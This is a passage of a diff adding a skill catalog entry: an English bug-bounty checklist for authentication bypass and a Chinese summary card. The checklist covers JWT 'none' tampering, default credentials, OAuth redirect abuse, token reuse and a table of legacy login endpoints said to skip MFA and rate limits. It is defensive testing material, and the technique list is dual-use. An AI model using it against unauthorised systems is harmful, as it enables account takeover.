unsigned assertion)\n\n5. **Test cross-portal session/token reuse**\n   - Log into `partners.shopify.com` type portals\n   - Attempt to use the issued token/cookie against the main admin portal\n   - Look for shared cookie domains, shared JWT secrets, or API tokens that work across contexts\n\n6. **Fuzz auth parameters**\n   - Null/empty passwords, `password[]=array`, SQL in username field\n   - Try `admin`/`admin`, `test`/`test` on staging subdomains\n   - Modify `role`, `is_admin`, `user_type` in JWTs (none algorithm, weak secret)\n\n7. **Check redirect and state parameters**\n   - Does removing `state` from OAuth break anything?\n   - Can you change `redirect_uri` to an open redirect target?\n   - Does the `RelayState` in SAML get validated?\n\n8. **Verify impact by escalating privileges**\n   - Don't stop at login — prove you can access admin functions, other users' data, or sensitive configuration\n   - Screenshot the highest-privilege action you can perform\n\n---\n\n## Legacy-Protocol Matrix (Probe These First on Any Custom-Branded Login)\n\nWhen a target has a custom, branded login UI (e.g. `customlogin.aspx`, `/auth/signin`, `/account/login`), **always probe the platform's legacy protocol endpoints with native credentials** in parallel. These endpoints frequently outlive the custom UI's protections and accept native credentials with NO rate limit, NO MFA challenge, NO CAPTCHA, NO anti-automation. This is the WordPress XMLRPC pattern generalised across CMS / portal / framework stacks.\n\n| Target tech | Legacy endpoint(s) to probe | Native-cred bypass surface |\n|---|---|---|\n| **WordPress** | `/xmlrpc.php` (`system.listMethods`, `wp.getUsersBlogs`, `system.multicall`) | Native WP user/pass; bypasses SSO, MFA, IP-allow rules on `/wp-login.php` |\n| **WordPress (REST)** | `/?rest_route=/wp/v2/users`, `/wp-json/wp/v2/users` | User enumeration anonymously even when login page is hardened |\n| **SharePoint (any version)** | `/_vti_bin/Authentication.asmx` (`Mode` + `Login` SOAP ops) | Native Forms-auth credential; FedAuth cookie returned; no rate limit on this endpoint observed on SP2013 farms — **this is the canonical SP equivalent of the WP XMLRPC bypass** |\n| **SharePoint legacy** | `/_vti_bin/_vti_aut/author.dll`, `/_vti_bin/_vti_adm/admin.dll`, `/_vti_bin/owssvr.dll` | FrontPage RPC; sometimes still wired to credential validators |\n| **SharePoint REST** | `/_api/contextinfo` (POST), `/_api/$metadata` | Anonymous FormDigest issuance; full API surface enumeration |\n| **Atlassian (Jira / Confluence)** | `/rest/auth/1/session` (basic-auth), `/rest/api/2/myself`, legacy `/rest/api/1.0/` | Native credentials accepted on `/rest/auth/1/session` even when Atlassian Crowd / Atlassian Access SSO is enforced on the UI |\n| **Drupal** | `/jsonapi/`, `/user/login?_format=json` | JSON POST endpoint that accepts native passwords; separate from SSO middleware |\n| **Drupal (D7 legacy)** | `/?q=user/login`, `/services/`, `/rest/` | Older REST modules with independent auth |\n| **Joomla** | `/administrator/index.php?option=com_login`, `/api/index.php/v1/users` | Native Joomla credentials ac",
+      "card": {
+        "title_zh": "认证绕过漏洞狩猎",
+        "purpose_zh": "面向授权漏洞赏金场景，系统梳理认证绕过类漏洞的狩猎方法：枚举登录入口、识别SAML/OAuth/JWT等认证机制、探测遗留协议端点、测试签名剥离与令牌复用，并验证提权影响。",
+        "does": [
+          "枚举目标所有认证入口，包括主登录、管理后台、合作方门户、API与遗留端点",
+          "按入口识别认证机制（表单、SAML、OAuth、API密钥、会话令牌）",
+          "独立探测遗留协议端点（如WordPress XMLRPC、SharePoint Authentication.asmx、Atlassian REST）是否绕过SSO/MFA",
+          "测试SAML签名剥离、注释注入、XML包装及未签名断言接受情况",
+          "测试跨门户会话/令牌复用、JWT算法混淆与受众混淆",
+          "检查OAuth state与redirect_uri处理，并验证提权后的实际影响"
+        ],
+        "inputs": [
+          "目标站点或授权测试范围",
+          "抓包工具（如Burp）捕获的认证请求与SAMLResponse",
+          "目标技术栈与URL/响应头/JS中的联邦认证信号"
+        ],
+        "outputs": [
+          "认证绕过漏洞发现与复现步骤",
+          "按严重程度评估的漏洞报告（含提权影响证据）"
+        ],
+        "scenarios": [
+          "对启用SSO的企业SaaS测试SAML/OAuth认证绕过",
+          "审计WordPress等CMS的XMLRPC等遗留端点是否绕过SSO",
+          "评估合作方/管理子域与主站之间的令牌复用风险",
+          "检查JWT在SSO/令牌信任链中的算法与受众混淆"
+        ],
+        "prerequisites": [
+          "获得目标授权（漏洞赏金项目或授权测试）",
+          "具备抓包与请求重放工具",
+          "了解SAML、OAuth、JWT等认证协议基础"
+        ],
+        "limits": [
+          "仅覆盖SSO/SAML/令牌信任链中的JWT问题，独立JWT签名伪造由hunt-jwt-crypto负责",
+          "SAML断言层攻击（XSW、注释注入、签名剥离、XXE）归hunt-saml所有",
+          "内容基于12份公开漏洞报告，非通用自动化工具",
+          "SSH证书信任伪造属平台特定的小众场景"
+        ],
+        "hosts": [
+          "未说明"
+        ],
+        "risk_flags": [
+          "shell",
+          "network"
+        ],
+        "tags": [
+          "安全",
+          "调研"
+        ],
+        "evidence": [
+          {
+            "field": "purpose_zh",
+            "quote": "Hunting skill for auth bypass vulnerabilities. Built from 12 public bug bounty reports across SAML XSW / parser-differential"
+          },
+          {
+            "field": "does",
+            "quote": "Map all authentication entry points"
+          },
+          {
+            "field": "does",
+            "quote": "Test XMLRPC independently of SSO"
+          },
+          {
+            "field": "does",
+            "quote": "Test signature stripping, comment injection, and XML wrapping attacks"
+          },
+          {
+            "field": "does",
+            "quote": "Test cross-portal session/token reuse"
+          },
+          {
+            "field": "does",
+            "quote": "Modify `role`, `is_admin`, `user_type` in JWTs (none algorithm, weak secret)"
+          },
+          {
+            "field": "does",
+            "quote": "Verify impact by escalating privileges"
+          },
+          {
+            "field": "prerequisites",
+            "quote": "For standalone JWT signature/crypto forging (alg:none, key confusion, kid/jku) see hunt-jwt-crypto; this skill covers JWT only inside SSO/SAML/token-trust bypass chains."
+          },
+          {
+            "field": "limits",
+            "quote": "SAML assertion-layer attacks (XSW, comment injection, signature stripping, XXE-in-assertion) are owned by hunt-saml"
+          },
+          {
+            "field": "limits",
+            "quote": "Add SSH-CA trust to the auth-surface list on Git-hosting targets; niche/platform-specific."
+          },
+          {
+            "field": "hosts",
+            "quote": "Use when hunting auth bypass — see the Legacy-Protocol Matrix for branded-UI vs legacy-endpoint patterns."
+          }
+        ]
+      }
+    }
+  ]
+}
